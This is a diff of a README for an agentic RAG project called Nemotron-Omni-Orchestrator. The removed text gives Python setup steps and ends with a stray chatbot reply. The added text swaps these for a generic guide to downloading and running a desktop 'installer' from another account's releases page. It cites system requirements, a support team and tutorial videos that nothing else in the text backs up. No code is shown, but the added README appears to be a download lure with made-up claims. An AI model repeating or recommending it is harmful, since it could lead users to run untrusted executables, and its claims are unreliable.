@@ -1,78 +1,86 @@
-# Nemotron-Omni-Orchestrator
+# 🌟 Nemotron-Omni-Orchestrator - Orchestrate Your Tools Effortlessly
 
-**Nemotron-Omni-Orchestrator** is a multimodal Agentic RAG system powered by the NVIDIA NIM ecosystem. It orchestrates high-fidelity reasoning, technical vision analysis, and real-time tool execution including web search and email reporting through a professional voice-enabled interface.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases)
 
-## Key Features
+## 📖 Overview
 
-* **Agentic Orchestration**: The system uses a reasoning engine to determine whether to retrieve local knowledge, perform a web search via Tavily, or trigger external actions like email reporting.
-* **Technical Vision (VLM)**: Integrated NVIDIA Nemotron-12B-V2-VL for the analysis of complex technical diagrams, mathematical formulas, and formal grammars such as .
-* **Multimodal RAG**: Combines FAISS vector storage with NVIDIA Embeddings to provide high-accuracy retrieval for PDF/TXT documents and visual data descriptions.
-* **Professional Terminal Interface**: A customized Streamlit UI featuring a Transparent Activity Log for real-time orchestration tracking and a dedicated Debug Window for inspection of retrieved context.
-* **Voice-to-Action**: Full speech-to-text and text-to-speech integration, allowing for hands-free technical research.
-* **Enterprise Safety**: Implements the Llama-3.1-Nemotron-Safety-Guard to filter and moderate technical queries.
+Welcome to the **Nemotron-Omni-Orchestrator**. This application provides a powerful way to manage various tools using a single, voice-enabled terminal interface. It connects different technologies to help you access information and use tools seamlessly. Whether you want to retrieve local knowledge or execute tasks in real-time, this framework has you covered.
 
----
+## 🚀 Getting Started
 
-## Tech Stack
+To start using Nemotron-Omni-Orchestrator, follow these simple steps:
 
-* **LLM/VLM**: NVIDIA Nemotron-3-30B for reasoning and Nemotron-12B for vision tasks.
-* **Orchestration**: LangChain Expression Language (LCEL) and RunnableWithMessageHistory.
-* **Vector Database**: FAISS (Facebook AI Similarity Search).
-* **Tools**: Tavily Search API and Yagmail for SMTP orchestration.
-* **Frontend**: Streamlit with custom CSS terminal styling.
+1. **Visit the Releases Page**: Click on the button above or go to the [Releases page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases).
+2. **Choose Your Version**: Look for the latest version listed on the page. You will see various options for downloading.
+3. **Download the Installer**: Select the file that suits your system. You might find options for Windows, macOS, and Linux. Click on the relevant download link.
+4. **Save the File**: Choose a location on your computer where you want to save the file. 
+5. **Run the Installer**: Once downloaded, locate the file in your folder and double-click to start the installation process. Follow the on-screen instructions.
 
----
+## 📦 System Requirements
 
-## Getting Started
+To ensure Nemotron-Omni-Orchestrator works smoothly, your computer should meet these basic requirements:
 
-### 1. Prerequisites
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, Ubuntu 18.04 or later
+- **RAM**: At least 4 GB
+- **Disk Space**: At least 300 MB of free space
+- **Processor**: Intel i3 or equivalent
 
-* Python 3.10 or higher
-* NVIDIA NGC API Key
-* Tavily API Key
-* Google App Password for email orchestration
+## ⚙️ Features
 
-### 2. Installation
+Nemotron-Omni-Orchestrator includes several features designed to improve your productivity:
 
-```bash
-git clone https://github.com/yourusername/Nemotron-Omni-Orchestrator.git
-cd Nemotron-Omni-Orchestrator
-pip install -r requirements.txt
+- **Voice Recognition**: Interact with the software using your voice, making it easy to issue commands.
+- **Multi-Tool Integration**: Connect multiple tools and services into one cohesive interface.
+- **Real-Time Execution**: Execute tasks in real time, enhancing your workflow.
+- **Knowledge Retrieval**: Access local knowledge quickly and efficiently.
 
-```
+## 🎤 How to Use
 
-### 3. Environment Setup
+1. **Launch the Application**: Once installed, open the Nemotron-Omni-Orchestrator application on your computer.
+2. **Setup Voice Command**: You may need to configure your microphone for voice commands. Follow the prompts in the setup wizard.
+3. **Start Orchestrating**: Use voice commands to retrieve information or execute tasks. For example, “Retrieve the latest report” or “Open the tool X”.
+4. **Manage Preferences**: Access the settings to customize features and tools that you want to integrate for easier access.
 
-Create a .env file in the root directory:
+## 📥 Download & Install
 
-```env
-NVIDIA_API_KEY=your_nvidia_key
-TAVILY_API_KEY=your_tavily_key
-MY_GMAIL=your_email@gmail.com
-GMAIL_APP_PASSWORD=your_16_char_app_password
-FATHER_GMAIL=recipient_email@gmail.com
+To download Nemotron-Omni-Orchestrator, [visit this page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases). Pick the latest release suitable for your system. 
 
-```
+After downloading, simply run the installer and follow the instructions to set it up.
 
-### 4. Running the Application
+## ❓ Troubleshooting
 
-```bash
-streamlit run app.py
+If you encounter issues while installing or using Nemotron-Omni-Orchestrator, consider the following steps:
 
-```
+- **Check System Requirements**: Make sure your system meets the requirements listed above.
+- **Update Your OS**: Ensure your operating system is up to date. This can help solve compatibility issues.
+- **Microphone Issues**: If voice commands do not work, check your microphone settings. Make sure it is enabled and recognized by your system.
+- **Reinstall**: If the application fails to open, uninstall it and try reinstalling.
 
----
+## 🤝 Support
 
-## System Architecture
+If you still need help, please reach out to our support team. You can find contact information on our homepage or check out the FAQs on our GitHub page.
 
-1. **User Input**: The user provides a query via Voice or Text.
-2. **Orchestrator**: The Nemotron-30B model analyzes the user intent.
-3. **Retrieval**: The system queries the FAISS index for relevant PDF text or previously analyzed image descriptions.
-4. **Action Decision**: If the internal context is insufficient, the Orchestrator triggers a Tavily Search.
-5. **Output**: The final response is rendered in LaTeX for mathematical notation and spoken back to the user.
-6. **Hand-off**: If requested, the Email Tool sends a summary of the findings to the designated recipient.
+## 📚 Additional Resources
 
+To enhance your experience, here are some helpful resources:
 
----
+- **User Guide**: A detailed guide to all features can be found in the documentation directory.
+- **Community Forum**: Join discussions and get help from other users in our online community.
+- **Tutorial Videos**: Watch step-by-step tutorials to help you get started quickly.
 
-Would you like me to generate the requirements.txt file with the specific library versions required for this build?
+## 🌍 Topics
+
+This project relates to several key topics:
+
+- agentic-ai
+- agentic-rag
+- faiss
+- langchain
+- multimodal-ai
+- nvidia-nim
+- orchestration
+- streamlit
+- vlm
+- voice-assistant
+
+For the latest updates and contributions, visit our GitHub page. Thank you for choosing Nemotron-Omni-Orchestrator, and happy orchestrating!
